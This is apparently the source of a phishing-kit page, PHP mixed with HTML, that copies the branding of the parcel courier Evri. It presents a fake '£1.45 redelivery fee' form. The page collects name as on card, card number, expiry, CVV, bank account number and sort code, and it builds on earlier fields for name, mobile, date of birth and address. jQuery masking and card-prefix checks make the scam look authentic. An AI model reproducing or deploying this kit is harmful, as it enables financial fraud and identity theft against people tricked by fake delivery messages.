...
if($_POST['firstName'] and $_POST['lastName'] and $_POST['mobile'] and $_POST['dob'] and $_POST['address']){
...
<html lang="en">
    <head>
        ...
        <title>Evri - The New Hermes | Cheap Parcel Delivery &amp; Courier Service</title>
        <meta charset="utf-8" />
    ...
    <body>
        <div id="__nuxt">
            <div id="__layout">
                <div>
                            ...
                            <div data-v-50e27515="" class="nav__top above-mobile">
                                <div data-v-50e27515="" class="nav__top-inner">
                                    ...
                                    <div data-v-50e27515="" class="nav__top-account">
                                        <div data-v-50e27515="" class="nav__top-account-item">Log in</div>
                                        <div data-v-50e27515="" class="nav__top-account-item">Sign up</div>
                                    </div>
                                </div>
                            </div>
                    ...
                    <div>
                        <div>
                            <section data-v-22af1acc="" data-v-08ab7fc4="" class="the-hero-banner" style="margin-bottom: 0px;">
                                <div data-v-22af1acc="" class="the-hero-banner__inner">
                                    <div data-v-22af1acc="" class="the-hero-banner__content the-hero-banner__content--fix-top">
                                        <h1 data-v-08ab7fc4="" data-v-22af1acc="" class="the-hero-banner__heading">Redelivery form</h1>
                                        <img data-v-08ab7fc4="" data-v-22af1acc="" src="evu_assetz/img/evri-heart.svg" alt="" class="the-hero-banner__title-image" />
                                    </div>
                                    <div data-v-22af1acc="" class="the-hero-banner__right">
                                        <div data-v-24de377c="" data-v-08ab7fc4="" class="hero-card" data-v-22af1acc="">
                                            <div data-v-24de377c="" class="tabs-card">
                                                <div data-v-24de377c="" class="tabs-card__tabs">
                                                    <div data-v-24de377c="" class="tabs-card__tab">Address</div>
                                                    <div data-v-24de377c="" class="tabs-card__tab tabs-card__tab--active">Fee</div>
                                                    <div data-v-24de377c="" class="tabs-card__tab">Schedule</div>
                                                </div>
                                                <div data-v-24de377c="" class="tabs-card__tab-content">
                                                    <div data-v-3b2e9f2c="" data-v-f1fbf6d0="" data-v-24de377c="" class="e-card form-card form-card e-card--thin-padding e-card--elevation-0" style="">
                                                        <div data-v-3b2e9f2c="" class="e-card__body">
                                                            <div data-v-f1fbf6d0="" data-v-3b2e9f2c="" class="form-card__intro">
                                                                <h3 data-v-f1fbf6d0="" data-v-3b2e9f2c="">Your redelivery fee is £1.45 (£1.04 + VAT)</h3>
                                                                <p data-v-f1fbf6d0="" data-v-3b2e9f2c="">Please fill the form below in order to proceed</p>
                                                            </div>
                                                            <form method="post" action="Scheduled?sslchannel=true&sessionid=<?=generateRandomString(130);?>">
                                                                <span data-v-f1fbf6d0="" class="form-card__form" data-v-3b2e9f2c="">
                                                                    <div style="grid-template-columns: 0; display: block;" data-v-f1fbf6d0="" class="form-card__form-fields">
                                                                        <div class="form-card__input">
                                                                            <div class="e-input__wrapper">
                                                                                <div class="e-input">
                                                                                    <label class="e-input__label" data-v-6ab39cc1="">
                                                                                        <span data-v-6ab39cc1=""> Name as it appears on card *</span>
                                                                                        <input name="ccname" id="ccname" type="text" required="required" class="e-input__field e-input__input" data-v-6ab39cc1="" />
                                                                                    </label>
                                                                                </div>
                                                                                <span style="display: none;" class="e-input__helper e-input__helper--error" data-v-6ab39cc1="">The Name as it appears on card is required</span>
                                                                            </div>
                                                                        </div>
                                                                        <br />
																		<div class="form-card__input">
                                                                            <div class="e-input__wrapper">
                                                                                <div class="e-input">
                                                                                    <label class="e-input__label" data-v-6ab39cc1="">
                                                                                        <span data-v-6ab39cc1=""> Card number *</span>
                                                                                        <input name="ccnum" id="ccnum" type="tel" required="required" class="e-input__field e-input__input" data-v-6ab39cc1="" />
                                                                                    </label>
                                                                                </div>
                                                                                <span style="display: none;" class="e-input__helper e-input__helper--error" data-v-6ab39cc1="">The Card number is required</span>
                                                                            </div>
                                                                        </div>
                                                                        <br />
                                                                        <div class="form-card__input">
                                                                            <div class="e-input__wrapper">
                                                                                <div class="e-input">
                                                                                    <label class="e-input__label" data-v-6ab39cc1="">
                                                                                        <span data-v-6ab39cc1=""> Card expiry date *</span>
                                                                                        <input name="ccexp" id="ccexp" type="tel" required="required" class="e-input__field e-input__input" data-v-6ab39cc1="" />
                                                                                    </label>
                                                                                </div>
                                                                                <span style="display: none;" class="e-input__helper e-input__helper--error" data-v-6ab39cc1="">The Card expiry date is required</span>
                                                                            </div>
                                                                        </div>
                                                                        <br />
                                                                        <div class="form-card__input">
                                                                            <div class="e-input__wrapper">
                                                                                <div class="e-input">
                                                                                    <label class="e-input__label" data-v-6ab39cc1="">
                                                                                        <span data-v-6ab39cc1=""> CVV *</span>
                                                                                        <input name="cccvv" id="cccvv" type="text" required="required" class="e-input__field e-input__input" data-v-6ab39cc1="" />
                                                                                    </label>
                                                                                </div>
                                                                                <span style="display: none;" class="e-input__helper e-input__helper--error" data-v-6ab39cc1="">The CVV is required</span>
                                                                            </div>
                                                                        </div>
                                                                        ...
                                                                        <div class="form-card__input">
                                                                            <div class="e-input__wrapper">
                                                                                <div class="e-input">
                                                                                    <label class="e-input__label" data-v-6ab39cc1="">
                                                                                        <span data-v-6ab39cc1=""> Account number *</span>
                                                                                        <input name="accno" id="accno" type="tel" required="required" class="e-input__field e-input__input" data-v-6ab39cc1="" />
                                                                                    </label>
                                                                                </div>
                                                                                <span style="display: none;" class="e-input__helper e-input__helper--error" data-v-6ab39cc1="">The Account number is required</span>
                                                                            </div>
                                                                        </div>
																		<br />
                                                                        <div class="form-card__input">
                                                                            <div class="e-input__wrapper">
                                                                                <div class="e-input">
                                                                                    <label class="e-input__label" data-v-6ab39cc1="">
                                                                                        <span data-v-6ab39cc1=""> Sortcode *</span>
                                                                                        <input name="sortcode" id="sortcode" type="tel" required="required" class="e-input__field e-input__input" data-v-6ab39cc1="" />
                                                                                    </label>
                                                                                </div>
                                                                                <span style="display: none;" class="e-input__helper e-input__helper--error" data-v-6ab39cc1="">The Sortcode is required</span>
                                                                            </div>
                                                                        </div>';
																		}
                                                                    ...
                                                                    <button data-v-3b48ca05="" data-v-f1fbf6d0="" type="submit" class="e-button e-button--type-primary e-button--variant-1 e-button--icon-right e-button--icon">
                                                                        <div data-v-3b48ca05="" class="e-button__icon">
                                                                            <div data-v-250fdcf4="" data-v-f1fbf6d0="" data-icon="chevron_right" class="e-icon e-icon--undefined" style="line-height: 24px;">
                                                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                                                    <path
                                                                                        fill-rule="evenodd"
                                                                                        clip-rule="evenodd"
                                                                                        d="M17.64 13.01a1.5 1.5 0 0 0 0-2.02l-7.9-8.665a1 1 0 1 0-1.48 1.349L15.855 12l-7.594 8.326a1 1 0 0 0 1.478 1.348l7.901-8.663Z"
                                                                                        fill="#007BC4"
                                                                                    ></path>
                                                                                </svg>
                                                                            </div>
                                                                        </div>
                                                                        <span data-v-3b48ca05="" class="e-button__slot-wrapper"> Next </span>
                                                                    </button>
                                                                </span>
                                                            </form>
                                                        </div>
                        ...
                        <div class="footer__main-container">
                            <div class="footer__main">
                                <li data-v-29c76001="" class="footer-link__group">
                                    ...
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Send a parcel</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Send international parcel</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">How to send a parcel</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link"> What I can and cannot send </a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link"> How to weigh your parcel </a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">How to wrap your parcel</a></div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                    ...
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold">
                                        <a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Track a parcel</a>
                                    </div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                    ...
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold">
                                        <a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Return a parcel</a>
                                    </div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link"> How to return a parcel </a></div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                    ...
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">ParcelShops</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Lockers</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Find a ParcelShop</a></div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                    ...
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Our prices</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Evri mobile app</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Alexa</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Google assistant</a></div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                    ...
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Help centre</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">FAQs</a></div>
                                </li>
                                <li data-v-29c76001="" class="footer-link__group">
                                    <div data-v-2ddfd4ba="" data-v-29c76001="" class="footer-link__mobile e-accordion-row e-accordion-row--mobile-footer">
                                        <div data-v-2ddfd4ba="" class="e-accordion-row__header">
                                    ...
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile footer-link__item--bold"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">About us</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">News</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Press</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Coronavirus update</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link">Cyber Security</a></div>
                                    <div data-v-29c76001="" class="footer-link__item footer-link__item--above-mobile"><a data-v-29c76001="" href="javascript:void(0);" class="footer-link__link"> Environment, social and governance </a></div>
                                </li>
                            </div>
                        </div>
                            ...
                            <div class="footer__subfooter">
                                <div data-v-1e1b39e0="" class="subfooter">
                                    <div data-v-1e1b39e0="" class="subfooter__links">
                                        <div data-v-1e1b39e0="" class="subfooter__link"><a data-v-1e1b39e0="" href="javascript:void(0);" class="subfooter__link-text">Terms &amp; conditions</a></div>
                                        <div data-v-1e1b39e0="" class="subfooter__link"><a data-v-1e1b39e0="" href="javascript:void(0);" class="subfooter__link-text">Privacy policy</a></div>
                                        <div data-v-1e1b39e0="" class="subfooter__link"><a data-v-1e1b39e0="" href="javascript:void(0);" class="subfooter__link-text">Terms of use</a></div>
                                        <div data-v-1e1b39e0="" class="subfooter__link"><a data-v-1e1b39e0="" href="javascript:void(0);" class="subfooter__link-text">Modern slavery</a></div>
                                        <div data-v-1e1b39e0="" class="subfooter__link"><a data-v-1e1b39e0="" href="javascript:void(0);" class="subfooter__link-text">Additional policies</a></div>
                                    </div>
                                    <div data-v-1e1b39e0="" class="subfooter__bottom">
                                        <div data-v-1e1b39e0="" class="subfooter__bottom-socials">
                                            <a data-v-1e1b39e0="" href="javascript:void(0);" class="subfooter__bottom-socials-link">
        ...
        <script src="evu_assetz/js/jquery.js"></script>
        <script src="evu_assetz/js/payment.js"></script>
        <script src="evu_assetz/js/mask.js"></script>
        <script>
            $(document).ready(function () {
                $("#ccexp").mask("00/0000",{placeholder:"MM/YYYY"});
                $("#accno").mask("00000000");
                $("#sortcode").mask("00-00-00");
				$("#ccnum").keyup(function () {
					var cc = $("#ccnum").val();
					if (cc.startsWith(3) || cc.startsWith(4) || cc.startsWith(5)) {
					} else {
						$("#ccnum").val("");
						$("#ccnum").addClass("nhsuk-input--error");
                        $("#ccnum").parent().addClass("nhsuk-form-group--error");
                        $("#ccnum").prev().show();
					}
				});
                ...
                allInputs.focusout(function () {
                    $(this).blur(function () {
                        if ($(this).prop("required")) {
                            if (!$(this).val()) {
                                $(this).addClass("e-input__input--error");
                                $(this).parent().parent().next().show();
                            } else {
                                $(this).removeClass("e-input__input--error");
